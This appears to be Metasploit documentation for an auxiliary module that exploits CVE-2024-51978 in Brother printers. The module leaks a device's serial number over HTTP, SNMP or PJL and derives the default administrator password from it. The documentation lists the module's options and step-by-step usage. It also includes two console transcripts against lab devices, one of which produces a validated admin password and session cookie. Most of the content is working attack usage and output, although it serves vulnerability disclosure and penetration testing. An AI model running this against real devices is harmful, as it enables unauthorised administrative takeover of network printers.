## Vulnerable Application

By leaking a target devices serial number, a remote attacker can generate the target devices default
administrator password. The target device may leak its serial number via unauthenticated HTTP, HTTPS, IPP,
SNMP, or PJL requests.

## Testing
Run the module against a vulnerable device (full list [here](https://www.cve.org/CVERecord?id=CVE-2024-51978)).
If the default password is correctly generated, the module will be able to verify this. 

The module will also report an HTTP cookie `AuthCookie` which can be used, for example via Burp's proxy feature, to
get access to an administrator session on the target devices web interface.

## Verification Steps

1. Start msfconsole
2. `use auxiliary/admin/misc/brother_default_admin_auth_bypass_cve_2024_51978`
3. `set RHOST <TARGET_IP_ADDRESS>`
4. `run`

## Options

### TargetSerial
A serial number to use for this target. If none is specified, the target will be queried via either HTTP, SNMP, or PJL
to discover the serial number (as per the `DiscoverSerialVia` option).

### DiscoverSerialVia
The technique to use to discover the serial number. Can be one of `AUTO`, `HTTP`, `SNMP`, or `PJL`. The default is `AUTO`.

### SaltLookupIndex
The index into the salt table to use when generating the default password. The default is `254`, which is the expected
value for Brother devices.

### SaltData
The salt data to use when generating the default password. By default, no salt data is required.

### ValidatePassword
Validate the default password by attempting to login. By default, this is set to `true`.

## Scenarios

_Note: In these example scenarios, the leaked serial numbers have been redacted with `***************`._

### MFC-L9570CDW

In this example, the target `MFC-L9570CDW` device was running the latest firmware at the time of testing (June 20, 2025),
whereby the `MAIN` version was `ZQ2503251054`, and the `SUB1` version was `1.35`. We can note that while the serial
number could not be leaked via HTTPS (via CVE-2024-51977), we were able to leak the serial number via SNMP and then
proceed to generate the correct default administrator password. The module validated that this password value is still
the default administrator password for the device.

```
msf6 auxiliary(admin/misc/brother_default_admin_auth_bypass_cve_2024_51978) > set VERBOSE true
VERBOSE => true
msf6 auxiliary(admin/misc/brother_default_admin_auth_bypass_cve_2024_51978) > set RHOSTS 192.168.86.62
RHOSTS => 192.168.86.62
msf6 auxiliary(admin/misc/brother_default_admin_auth_bypass_cve_2024_51978) > show options 

Module options (auxiliary/admin/misc/brother_default_admin_auth_bypass_cve_2024_51978):

   Name               Current Setting            Required  Description
   ----               ---------------            --------  -----------
   COMMUNITY          public                     yes       SNMP Community String
   PJL_RPORT          9100                       yes       The target port number for PJL
   Proxies                                       no        A proxy chain of format type:host:port[,type:host:port][...]. Supported p
                                                           roxies: sapni, socks4, socks5, socks5h, http
   RETRIES            1                          yes       SNMP Retries
   RHOSTS             192.168.86.62              yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit
                                                           /basics/using-metasploit.html
   RPORT              443                        yes       The target port (TCP)
   SNMP_OID_SERAILNO  1.3.6.1.2.1.43.5.1.1.17.1  yes       The SNMP OID for the serial number
   SNMP_RPORT         161                        yes       The target port number for SNMP
   SSL                true                       no        Negotiate SSL/TLS for outgoing connections
   TARGETURI          /                          yes       The base URI path to the web admin console
   TIMEOUT            1                          yes       SNMP Timeout
   VERSION            1                          yes       SNMP Version <1/2c>
   VHOST                                         no        HTTP server virtual host


View the full module info with the info, or info -d command.

msf6 auxiliary(admin/misc/brother_default_admin_auth_bypass_cve_2024_51978) > run
[*] Running module against 192.168.86.62
[*] Attempting to leak serial number via HTTP
[-] Unexpected HTTP response code: 302
[*] Attempting to leak serial number via SNMP
[*] Leaked target serial number via SNMP: ***************
[*] Generating default password with salt lookup index 254 and salt data 7HOLDhk'
[*] Generated password value: r/5LM&U>
[*] Attempting to validate password
[*] Received an AuthCookie value: bi56MaYmMOhcwuH8miqCW5YvSGqKRqr8EOgiAr0yA20%3D
[+] Successfully validated the administrator password: r/5LM&U>
[*] Auxiliary module execution completed
msf6 auxiliary(admin/misc/brother_default_admin_auth_bypass_cve_2024_51978) >
```

### DCP-L2530DW

In this example, the target `DCP-L2530DW` device was running the following firmware version, whereby the `MAIN` version
was `ZC2403082049`, and the `SUB1` version was `1.04`. We can note that the serial number was successfully leaked via
HTTPS (via CVE-2024-51977), however the password value generated was not the devices default password, so validation
did not succeed.

```
msf6 auxiliary(admin/misc/brother_default_admin_auth_bypass_cve_2024_51978) > set RHOSTS 192.168.86.3
RHOSTS => 192.168.86.3
msf6 auxiliary(admin/misc/brother_default_admin_auth_bypass_cve_2024_51978) > show options 

Module options (auxiliary/admin/misc/brother_default_admin_auth_bypass_cve_2024_51978):

   Name               Current Setting            Required  Description
   ----               ---------------            --------  -----------
   COMMUNITY          public                     yes       SNMP Community String
   PJL_RPORT          9100                       yes       The target port number for PJL
   Proxies                                       no        A proxy chain of format type:host:port[,type:host:port][...]. Supported p
                                                           roxies: sapni, socks4, socks5, socks5h, http
   RETRIES            1                          yes       SNMP Retries
   RHOSTS             192.168.86.3               yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit
                                                           /basics/using-metasploit.html
   RPORT              443                        yes       The target port (TCP)
   SNMP_OID_SERAILNO  1.3.6.1.2.1.43.5.1.1.17.1  yes       The SNMP OID for the serial number
   SNMP_RPORT         161                        yes       The target port number for SNMP
   SSL                true                       no        Negotiate SSL/TLS for outgoing connections
   TARGETURI          /                          yes       The base URI path to the web admin console
   TIMEOUT            1                          yes       SNMP Timeout
   VERSION            1                          yes       SNMP Version <1/2c>
   VHOST                                         no        HTTP server virtual host


View the full module info with the info, or info -d command.

msf6 auxiliary(admin/misc/brother_default_admin_auth_bypass_cve_2024_51978) > run
[*] Running module against 192.168.86.3
[*] Attempting to leak serial number via HTTP
[*] Leaked target serial number via HTTP: ***************
[*] Generating default password with salt lookup index 254 and salt data 7HOLDhk'
[*] Generated password value: pX-KDn3+
[*] Attempting to validate password
[-] Failed to login with the administrator password: pX-KDn3+
[*] Auxiliary module execution completed
msf6 auxiliary(admin/misc/brother_default_admin_auth_bypass_cve_2024_51978) >
```
